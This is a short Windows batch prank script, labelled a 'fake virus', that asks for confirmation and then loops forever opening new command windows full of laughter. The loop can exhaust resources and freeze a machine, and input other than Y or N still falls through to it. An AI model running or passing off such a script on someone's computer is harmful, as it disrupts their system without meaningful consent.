cls
@echo off
title Fake virus pack by jaxon: Spam windows
echo Are you sure you want to run spam windows? (Y/N)
set/p "cho=>"
if %cho%==Y goto Win
if %cho%==y goto Win
if %cho%==N goto End
if %cho%==n goto End
:Win
start cmd /k echo HAHAHAHHAHAHHAHHAHAHHAHAHHAHAHAHAHHAHAHAHHAHAHHAHHAHAHHAHHAHHAHAHHAHHAHAHHAHAHHAHHAHHAHHAHAH
goto Win
:End

